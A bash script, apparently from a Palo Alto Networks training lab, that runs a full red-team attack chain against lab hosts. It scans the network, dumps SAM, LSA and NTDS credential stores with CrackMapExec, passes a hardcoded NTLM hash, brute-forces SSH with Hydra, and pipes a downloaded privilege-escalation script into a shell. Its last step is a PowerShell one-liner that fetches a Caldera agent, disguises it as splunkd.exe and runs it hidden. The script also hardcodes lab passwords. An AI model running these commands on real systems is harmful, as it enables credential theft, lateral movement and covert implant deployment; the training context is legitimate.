#!/bin/bash
# Copyright (c) 2024, Palo Alto Networks
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

# Author: Richard Porter rporter@paloaltonetworks.com>

function check_bin() {
  if [! -f /usr/bin/$1 ]; then
    echo "Error: $1 not found in /usr/bin" >&2
    echo "Exiting, please contact the instructor"
    exit 1
  fi
}

function main() {
  bins=("caldera" "nmap" "crackmapexec" "bloodhound-python" "hydra")
  for bin in "${bins[@]}"; do
    check_bin "$bin"
  done
# Starting up Caldera to use default password
caldera --insecure &

# Changing Nameserver to DC for Bloodhound
echo 'nameserver 10.1.0.20' | tee /etc/resolv.conf

# Running port sweep in backgrounb
nmap -sV -p 445,80,443,22 10.1.0.0/16 &

# SMB Attacks
crackmapexec smb -u lab-user -p 'Paloalto1!' -d byos 10.2.0.20 --sam
crackmapexec smb -u lab-user -p 'Paloalto1!' -d byos 10.2.0.20 --lsa
crackmapexec smb -u lab-user -H e6b41a6fceef5aae07b4a38e457721bb -d . 10.1.0.0/24
crackmapexec smb -u lab-user -H e6b41a6fceef5aae07b4a38e457721bb -d . 10.1.0.20 --ntds

# Bloodhound Domain enumeration
bloodhound-python -u lab-user -p 'Paloalto1!' -d byos.local

# SSH brute force
hydra -l ubuntu -P xato-net-10-million-passwords-100.txt 10.1.0.50 ssh 

# Linux priv-esc check
crackmapexec ssh -u ubuntu -p 'Paloalto1!' -x 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh' 10.1.0.50

# Caldera Agent Setup
crackmapexec smb -u lab-user -p 'Paloalto1!' -d byos 10.1.0.20 10.2.0.20  -X '$server="http://10.2.0.41:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;'
  echo "Script completed. Head to http://localhost:8888 in your browser and confirm you have agents reporting in. Username is red and password is admin. Then follow instruction provided for running a new operation.\n"
}
